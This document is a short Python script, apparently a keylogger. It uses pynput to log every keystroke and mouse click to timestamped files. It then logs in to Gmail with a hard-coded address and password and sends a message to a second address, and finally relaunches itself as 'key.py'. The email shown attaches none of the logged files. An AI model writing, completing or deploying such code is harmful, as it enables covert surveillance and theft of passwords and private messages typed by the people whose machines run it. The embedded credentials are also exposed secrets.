import os

from pynput import keyboard, mouse
import time
import smtplib
from email.message import EmailMessage

timestr = time.strftime("%Y-%m-%d__%H-%M-%S")
last_time = time.time()
time_now = time.time()

msg = EmailMessage()
msg['Subject'] = 'Наши файлы'
msg['From'] = 'kuzalex7799@gmail.com'
msg['To'] = 'mmromadin@gmail.com'
msg.set_content('Прикреплённые файлы:')


def on_key_press(key):
    global last_time
    global time_now
    time_now = time.time()
    with open('keyboardON ' + timestr + '.txt', 'a') as f:
        try:
            f.write('Key pressed: {0}\n'.format(key.char))
            if key == keyboard.Key.esc:
                return False

        except AttributeError:
            f.write('Special Key pressed: {0}\n'.format(key))
            if time_now - last_time > 20:
                return False


def on_click(x, y, button, pressed):
    global last_time
    global time_now
    time_now = time.time()
    with open('mouseON ' + timestr + '.txt', 'a') as f:
        if pressed:
            f.write('Mouse clicked at ({0}, {1}) with button {2}\n'.format(x, y, button))
        if time_now - last_time > 20:
            return False


keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()

try:
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('kuzalex7799@gmail.com', 'yueq aiyl dyid lmep')
        smtp.send_message(msg)
except KeyboardInterrupt:
    print('Программа была прервана пользователем.')
except Exception as e:
    print('Ошибка при отправке сообщения:', e)

os.startfile('key.py')
    